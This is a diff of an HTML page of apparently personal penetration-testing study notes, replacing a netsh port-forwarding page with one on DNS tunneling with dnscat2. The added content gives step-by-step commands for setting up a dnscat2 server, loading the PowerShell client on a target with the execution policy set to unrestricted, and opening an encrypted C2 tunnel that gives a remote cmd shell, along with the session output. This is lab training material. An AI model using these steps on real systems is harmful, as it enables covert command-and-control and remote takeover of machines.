@@ -6,7 +6,7 @@
   <meta charset="utf-8" /><meta name="viewport" content="width=device-width, initial-scale=1" />
 
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Port Forwarding with Windows Netsh &mdash; CelestialTech-Notes R1 documentation</title>
+  <title>DNS Tunneling with Dnscat2 &mdash; CelestialTech-Notes R1 documentation</title>
       <link rel="stylesheet" type="text/css" href="../../_static/pygments.css?v=8f9ffe49" />
       <link rel="stylesheet" type="text/css" href="../../_static/css/theme.css?v=e59714d7" />
       <link rel="stylesheet" type="text/css" href="../../_static/dark_mode_css/general.css?v=c0a7eb24" />
@@ -23,8 +23,8 @@
     <script src="../../_static/js/theme.js"></script>
     <link rel="index" title="Index" href="../../genindex.html" />
     <link rel="search" title="Search" href="../../search.html" />
-    <link rel="next" title="DNS Tunneling with Dnscat2" href="DNS%20Tunneling%20with%20Dnscat2.html" />
-    <link rel="prev" title="Web Server Pivoting with Rpivot" href="Web%20Server%20Pivoting%20with%20Rpivot.html" /> 
+    <link rel="next" title="SOCKS5 Tunneling with Chisel" href="SOCKS5%20Tunneling%20with%20Chisel.html" />
+    <link rel="prev" title="Port Forwarding with Windows Netsh" href="Port%20Forwarding%20with%20Windows%20Netsh.html" /> 
 </head>
 
 <body class="wy-body-for-nav"> 
@@ -72,11 +72,13 @@
 <li class="toctree-l1"><a class="reference internal" href="SSH%20for%20Windows%3A%20plink.exe.html">SSH for Windows: plink.exe</a></li>
 <li class="toctree-l1"><a class="reference internal" href="SSH%20Pivoting%20with%20Sshuttle.html">SSH Pivoting with Sshuttle</a></li>
 <li class="toctree-l1"><a class="reference internal" href="Web%20Server%20Pivoting%20with%20Rpivot.html">Web Server Pivoting with Rpivot</a></li>
-<li class="toctree-l1 current"><a class="current reference internal" href="#">Port Forwarding with Windows Netsh</a><ul>
+<li class="toctree-l1"><a class="reference internal" href="Port%20Forwarding%20with%20Windows%20Netsh.html">Port Forwarding with Windows Netsh</a></li>
+<li class="toctree-l1 current"><a class="current reference internal" href="#">DNS Tunneling with Dnscat2</a><ul>
 <li class="toctree-l2"><a class="reference internal" href="#description">Description</a></li>
+<li class="toctree-l2"><a class="reference internal" href="#installation">Installation</a></li>
+<li class="toctree-l2"><a class="reference internal" href="#usage">Usage</a></li>
 </ul>
 </li>
-<li class="toctree-l1"><a class="reference internal" href="DNS%20Tunneling%20with%20Dnscat2.html">DNS Tunneling with Dnscat2</a></li>
 <li class="toctree-l1"><a class="reference internal" href="SOCKS5%20Tunneling%20with%20Chisel.html">SOCKS5 Tunneling with Chisel</a></li>
 </ul>
 <p class="caption" role="heading"><span class="caption-text">Tools</span></p>
@@ -139,9 +141,9 @@
           <div role="navigation" aria-label="Page navigation">
   <ul class="wy-breadcrumbs">
       <li><a href="../../index.html" class="icon icon-home" aria-label="Home"></a></li>
-      <li class="breadcrumb-item active">Port Forwarding with Windows Netsh</li>
+      <li class="breadcrumb-item active">DNS Tunneling with Dnscat2</li>
       <li class="wy-breadcrumbs-aside">
-            <a href="../../_sources/CPTS/Initial Access/Port Forwarding with Windows Netsh.rst.txt" rel="nofollow"> View page source</a>
+            <a href="../../_sources/CPTS/Initial Access/DNS Tunneling with Dnscat2.rst.txt" rel="nofollow"> View page source</a>
       </li>
   </ul>
   <hr/>
@@ -149,15 +151,70 @@
           <div role="main" class="document" itemscope="itemscope" itemtype="http://schema.org/Article">
            <div itemprop="articleBody">
              
-  <section id="port-forwarding-with-windows-netsh">
-<h1>Port Forwarding with Windows Netsh<a class="headerlink" href="#port-forwarding-with-windows-netsh" title="Link to this heading"></a></h1>
+  <section id="dns-tunneling-with-dnscat2">
+<h1>DNS Tunneling with Dnscat2<a class="headerlink" href="#dns-tunneling-with-dnscat2" title="Link to this heading"></a></h1>
 <section id="description">
 <h2>Description<a class="headerlink" href="#description" title="Link to this heading"></a></h2>
-<p>A Windows command line utility for:
-1. Finding routes
-2. Viewing firewall configs
-3. Adding proxies
-4. Creating port forwarding rules</p>
+<p>Dnscat2 is a tool to leverage the TXT record to transfer data between to machines.  It leverages an encrypted C&amp;C (or C2)
+chanel.</p>
+</section>
+<section id="installation">
+<h2>Installation<a class="headerlink" href="#installation" title="Link to this heading"></a></h2>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">git clone https://github.com/iagox86/dnscat2.git</span>
+
+<span class="go">cd dnscat2/server/</span>
+<span class="go">sudo gem install bundler</span>
+<span class="go">sudo bundle install</span>
+</pre></div>
+</div>
+</section>
+<section id="usage">
+<h2>Usage<a class="headerlink" href="#usage" title="Link to this heading"></a></h2>
+<p><strong>step 1</strong></p>
+<p>Starting the dnscat2 server</p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">sudo ruby dnscat2.rb --dns host=10.10.15.24,port=53,domain=inlanefreight.local --no-cache</span>
+</pre></div>
+</div>
+<p>The output of this command will yield a secret key that is to be used on the client</p>
+<p><strong>step 2</strong>
+To use the Windows client clone the following repository</p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">git clone https://github.com/lukebaggett/dnscat2-powershell.git</span>
+</pre></div>
+</div>
+<p>Upload the .ps1 file to the target.</p>
+<p><strong>Step 3</strong> Change the security policy and Load the file into the cmdlet</p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">Set-ExecutionPolicy -ExecutionPolicy unrestricted -Scope Process</span>
+<span class="go">Import-Module ./dnscat2.ps1</span>
+</pre></div>
+</div>
+<p><strong>Step 4</strong> establish a tunnel back to the attack host</p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">Start-Dnscat2 -DNSserver 10.10.14.18 -Domain inlanefreight.local -PreSharedSecret 37268a1c8f891abc814e1a75db083cac -Exec cmd</span>
+</pre></div>
+</div>
+<p>You can interact with the tunnel by looking at options with <cite>?</cite></p>
+<p><strong>Step 5</strong></p>
+<p>Interacting with the tunnel</p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">dnscat2&gt; window -i 1</span>
+<span class="go">New window created: 1</span>
+<span class="go">history_size (session) =&gt; 1000</span>
+<span class="go">Session 1 Security: ENCRYPTED AND VERIFIED!</span>
+<span class="gp gp-VirtualEnv">(the security depends on the strength of your pre-shared secret!)</span>
+<span class="go">This is a console session!</span>
+
+<span class="go">That means that anything you type will be sent as-is to the</span>
+<span class="go">client, and anything they type will be displayed as-is on the</span>
+<span class="go">screen! If the client is executing a command and you don&#39;t</span>
+<span class="go">see a prompt, try typing &#39;pwd&#39; or something!</span>
+
+<span class="go">To go back, type ctrl-z.</span>
+
+<span class="go">Microsoft Windows [Version 10.0.18363.1801]</span>
+<span class="gp gp-VirtualEnv">(c)</span> <span class="go">2019 Microsoft Corporation. All rights reserved.</span>
+
+<span class="go">C:\Windows\system32&gt;</span>
+<span class="go">exec (OFFICEMANAGER) 1&gt;</span>
+</pre></div>
+</div>
 </section>
 </section>
 
@@ -165,8 +222,8 @@
            </div>
           </div>
           <footer><div class="rst-footer-buttons" role="navigation" aria-label="Footer">
-        <a href="Web%20Server%20Pivoting%20with%20Rpivot.html" class="btn btn-neutral float-left" title="Web Server Pivoting with Rpivot" accesskey="p" rel="prev"><span class="fa fa-arrow-circle-left" aria-hidden="true"></span> Previous</a>
-        <a href="DNS%20Tunneling%20with%20Dnscat2.html" class="btn btn-neutral float-right" title="DNS Tunneling with Dnscat2" accesskey="n" rel="next">Next <span class="fa fa-arrow-circle-right" aria-hidden="true"></span></a>
+        <a href="Port%20Forwarding%20with%20Windows%20Netsh.html" class="btn btn-neutral float-left" title="Port Forwarding with Windows Netsh" accesskey="p" rel="prev"><span class="fa fa-arrow-circle-left" aria-hidden="true"></span> Previous</a>
+        <a href="SOCKS5%20Tunneling%20with%20Chisel.html" class="btn btn-neutral float-right" title="SOCKS5 Tunneling with Chisel" accesskey="n" rel="next">Next <span class="fa fa-arrow-circle-right" aria-hidden="true"></span></a>
     </div>
 
   <hr/>
